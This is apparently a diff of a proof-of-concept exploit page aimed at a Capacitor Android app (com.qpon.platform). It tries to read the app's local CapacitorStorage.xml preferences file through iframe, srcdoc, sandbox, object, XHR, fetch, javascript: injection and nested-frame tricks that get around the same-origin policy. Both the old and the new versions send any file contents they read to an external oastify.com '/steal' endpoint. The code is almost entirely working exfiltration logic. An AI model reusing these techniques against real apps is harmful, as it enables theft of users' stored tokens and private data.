@@ -3,124 +3,79 @@
 <script>
 var L=document.getElementById("log");
 function log(s){L.textContent+=s+"\n"}
-log("=== Test ALL methods to read localhost file ===\n");
+log("=== iframe src + srcdoc mixing tests ===\n");
 
 var target = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
 
-// Test 1: iframe — try to read contentDocument after load
-log("--- Test 1: iframe ---");
-var ifr = document.createElement("iframe");
-ifr.style.width="100%";
-ifr.style.height="200px";
-ifr.src = target;
-ifr.onload = function() {
+// Test 1: srcdoc with script that fetches localhost file
+// srcdoc inherits parent origin — does fetch to localhost work from srcdoc?
+log("--- Test 1: srcdoc fetch localhost ---");
+var ifr1 = document.createElement("iframe");
+ifr1.srcdoc = '<script>fetch("' + target + '").then(r=>r.text()).then(d=>{parent.postMessage({t:"srcdoc_fetch",d:d},"*")}).catch(e=>{parent.postMessage({t:"srcdoc_fetch_err",d:e.message},"*")})<\/script>';
+document.body.appendChild(ifr1);
+
+// Test 2: src loads localhost, then replace with srcdoc
+// Does srcdoc inherit the iframe's PREVIOUS origin (localhost)?
+log("--- Test 2: src first, then srcdoc ---");
+var ifr2 = document.createElement("iframe");
+ifr2.src = target;
+ifr2.onload = function() {
+  log("[test2] src loaded, now setting srcdoc...");
+  ifr2.srcdoc = '<script>document.write("origin: "+window.origin);fetch("' + target + '").then(r=>r.text()).then(d=>{parent.postMessage({t:"src_then_srcdoc",d:d},"*")}).catch(e=>{parent.postMessage({t:"src_then_srcdoc_err",d:e.message},"*")})<\/script>';
+};
+document.body.appendChild(ifr2);
+
+// Test 3: iframe src + sandbox="allow-scripts allow-same-origin"
+// Does sandbox change CORS behavior?
+log("--- Test 3: sandbox allow-scripts allow-same-origin ---");
+var ifr3 = document.createElement("iframe");
+ifr3.sandbox = "allow-scripts allow-same-origin";
+ifr3.src = target;
+ifr3.onload = function() {
   try {
-    var doc = ifr.contentDocument || ifr.contentWindow.document;
-    var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
-    log("[iframe] READ SUCCESS: " + txt.substring(0,200));
-    // EXFILTRATE!
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=iframe&d=" + encodeURIComponent(txt);
+    var doc = ifr3.contentDocument || ifr3.contentWindow.document;
+    var txt = doc.documentElement ? doc.documentElement.textContent : doc.body.textContent;
+    log("[test3] sandbox read: " + txt.substring(0,200));
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=sandbox&d=" + encodeURIComponent(txt);
   } catch(e) {
-    log("[iframe] blocked: " + e.message);
+    log("[test3] blocked: " + e.message);
   }
 };
-document.body.appendChild(ifr);
+document.body.appendChild(ifr3);
 
-// Test 2: object tag
-log("--- Test 2: object ---");
-var obj = document.createElement("object");
-obj.data = target;
-obj.type = "text/xml";
-obj.style.width="100%";
-obj.style.height="200px";
-obj.onload = function() {
+// Test 4: window.open target name trick
+// Open localhost in named frame, then inject via window.open javascript:
+log("--- Test 4: named frame + window.open javascript: ---");
+var ifr4 = document.createElement("iframe");
+ifr4.name = "stealframe";
+ifr4.src = target;
+ifr4.onload = function() {
   try {
-    var doc = obj.contentDocument;
-    var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
-    log("[object] READ SUCCESS: " + txt.substring(0,200));
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=object&d=" + encodeURIComponent(txt);
+    window.open("javascript:void(parent.postMessage({t:'named_frame',d:document.body.textContent||document.documentElement.textContent},'*'))", "stealframe");
+    log("[test4] window.open javascript: sent");
   } catch(e) {
-    log("[object] blocked: " + e.message);
+    log("[test4] blocked: " + e.message);
   }
 };
-document.body.appendChild(obj);
+document.body.appendChild(ifr4);
 
-// Test 3: embed tag
-log("--- Test 3: embed ---");
-var emb = document.createElement("embed");
-emb.src = target;
-emb.type = "text/xml";
-emb.style.width="100%";
-emb.style.height="100px";
-document.body.appendChild(emb);
-setTimeout(function(){
-  try {
-    var doc = emb.getSVGDocument ? emb.getSVGDocument() : null;
-    log("[embed] getSVGDocument: " + (doc ? "YES" : "null"));
-    if(doc) {
-      var txt = doc.documentElement.textContent;
-      log("[embed] READ SUCCESS: " + txt.substring(0,200));
+// Test 5: Double iframe — srcdoc creates inner iframe to localhost
+// srcdoc inherits parent origin. But what if srcdoc iframe then loads localhost in sub-iframe?
+log("--- Test 5: srcdoc nested iframe ---");
+var ifr5 = document.createElement("iframe");
+ifr5.srcdoc = '<iframe id="inner" src="' + target + '" onload="try{var d=this.contentDocument.documentElement.textContent;parent.parent.postMessage({t:\'nested\',d:d},\'*\')}catch(e){parent.parent.postMessage({t:\'nested_err\',d:e.message},\'*\')}"></iframe>';
+document.body.appendChild(ifr5);
+
+// Listen for postMessage results from all tests
+window.addEventListener("message", function(e) {
+  var d = e.data;
+  if(d && d.t) {
+    log("\n[RESULT " + d.t + "] " + (d.d ? d.d.substring(0,300) : "empty"));
+    if(d.d && d.d.length > 10 && d.d.indexOf("<?xml") >= 0) {
+      log("*** FILE CONTENT STOLEN! ***");
     }
-  } catch(e) {
-    log("[embed] blocked: " + e.message);
   }
-}, 3000);
-
-// Test 4: XMLHttpRequest (expect CORS fail, but let's confirm)
-log("--- Test 4: XHR ---");
-var xhr = new XMLHttpRequest();
-xhr.open("GET", target, true);
-xhr.onload = function() {
-  log("[xhr] status=" + xhr.status + " len=" + xhr.responseText.length);
-  log("[xhr] READ SUCCESS: " + xhr.responseText.substring(0,200));
-  new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=xhr&d=" + encodeURIComponent(xhr.responseText);
-};
-xhr.onerror = function() { log("[xhr] error (CORS)") };
-xhr.send();
-
-// Test 5: fetch with no-cors mode
-log("--- Test 5: fetch no-cors ---");
-fetch(target, {mode:"no-cors"}).then(function(r) {
-  log("[fetch-nocors] status=" + r.status + " type=" + r.type);
-  return r.text();
-}).then(function(t) {
-  log("[fetch-nocors] text len=" + t.length);
-  if(t.length > 0) {
-    log("[fetch-nocors] READ SUCCESS: " + t.substring(0,200));
-    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com/steal?method=fetch&d=" + encodeURIComponent(t);
-  }
-}).catch(function(e) {
-  log("[fetch-nocors] error: " + e.message);
 });
-
-// Test 6: fetch with cors mode
-log("--- Test 6: fetch cors ---");
-fetch(target).then(function(r) {
-  return r.text();
-}).then(function(t) {
-  log("[fetch-cors] READ SUCCESS: " + t.substring(0,200));
-}).catch(function(e) {
-  log("[fetch-cors] error: " + e.message);
-});
-
-// Test 7: img → canvas (won't work for XML but test CORS enforcement)
-log("--- Test 7: img+canvas ---");
-var img = new Image();
-img.crossOrigin = "anonymous";
-img.onload = function() {
-  try {
-    var c = document.createElement("canvas");
-    c.width = img.width; c.height = img.height;
-    var ctx = c.getContext("2d");
-    ctx.drawImage(img, 0, 0);
-    var data = c.toDataURL();
-    log("[canvas] READ SUCCESS: " + data.substring(0,100));
-  } catch(e) {
-    log("[canvas] tainted: " + e.message);
-  }
-};
-img.onerror = function() { log("[img] load failed (not an image)") };
-img.src = target;
 
 log("\nWaiting for results...\n");
 </script></body></html>
